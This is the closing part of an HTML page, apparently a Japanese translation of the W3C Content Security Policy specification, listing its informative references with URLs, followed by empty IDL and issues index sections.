	<dd>https://url.spec.whatwg.org/</dd>

</dl>


		</section>
		<section id="informative">
<h3 title="Informative References">文献（参考）</h3>

<dl>

	<dt>[APPMANIFEST]</dt>
	<dd>Marcos Caceres; et al. Web App Manifest. 12 September 2016. WD.</dd>
	<dd>https://w3c.github.io/manifest/</dd>

	<dt>[BEACON]</dt>
	<dd>Ilya Grigorik; et al. Beacon. 30 August 2016. WD.</dd>
	<dd>https://w3c.github.io/beacon/</dd>

	<dt>[CSP2]</dt>
	<dd>Mike West; Adam Barth; Daniel Veditz. Content Security Policy Level 2. 21 July 2015. CR.</dd>
	<dd>https://w3c.github.io/webappsec/specs/CSP2/</dd>

	<dt>[CSS-ABUSE]</dt>
	<dd>Chris Evans. Generic cross-browser cross-domain theft. 28 December 2009.</dd>
	<dd>https://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html</dd>

	<dt>[EVENTSOURCE]</dt>
	<dd>Ian Hickson. Server-Sent Events. 3 February 2015. REC.</dd>
	<dd>http://dev.w3.org/html5/eventsource/</dd>

	<dt>[FILEDESCRIPTOR-2015]</dt>
	<dd>filedescriptor. CSP 2015. 23 November 2015.
	<dd>https://blog.innerht.ml/csp-2015/#danglingmarkupinjection</dd>

	<dt>[H5SC3]</dt>
	<dd>Mario Heiderich. H5SC Minichallenge 3: "Sh*t, it's CSP!".</dd>
	<dd>https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22</dd>

	<dt>[HTML-DESIGN]</dt>
	<dd>Anne Van Kesteren; Maciej Stachowiak. HTML Design Principles.</dd>
	<dd>https://www.w3.org/TR/html-design-principles/</dd>

	<dt>[MIX]</dt>
	<dd>Mike West. Mixed Content. 2 August 2016. CR.</dd>
	<dd>https://w3c.github.io/webappsec-mixed-content/</dd>

	<dt>[TIMING]</dt>
	<dd>Paul Stone. Pixel Perfect Timing Attacks with HTML5.</dd>
	<dd>http://www.contextis.com/documents/2/Browser_Timing_Attacks.pdf</dd>

	<dt>[UISECURITY]</dt>
	<dd>Brad Hill. User Interface Security and the Visibility API. 7 June 2016. WD.</dd>
	<dd>https://w3c.github.io/webappsec-uisecurity/index.html</dd>

	<dt>[UPGRADE-INSECURE-REQUESTS]</dt>
	<dd>Mike West. Upgrade Insecure Requests. 8 October 2015. CR.</dd>
	<dd>https://w3c.github.io/webappsec-upgrade-insecure-requests/</dd>

	<dt>[WEBSOCKETS]</dt>
	<dd>Ian Hickson. The WebSocket API. 20 September 2012. CR.</dd>
	<dd>https://www.w3.org/TR/websockets/</dd>

	<dt>[XHR]</dt>
	<dd>Anne van Kesteren. XMLHttpRequest Standard. Living Standard.</dd>
	<dd>https://xhr.spec.whatwg.org/</dd>

	<dt>[XSLT]</dt>
	<dd>James Clark. XSL Transformations (XSLT) Version 1.0. 16 November 1999. REC.</dd>
	<dd>https://www.w3.org/TR/xslt</dd>
</dl>



	</section>
	<section id="idl-index">
<h2 title="IDL Index" data-cycling="pre.idl">IDL 索引</h2>
<p class="trans-note">【
この節の内容は省略（見出しクリックで巡回）。
】</p>
	</section>
	<section id="issues-index">
<h2 title="Issues Index">課題 索引</h2>
<p class="trans-note">【
この節の内容は省略（見出しクリックで巡回）。
】</p>

	</section>
</section>

</body></html>
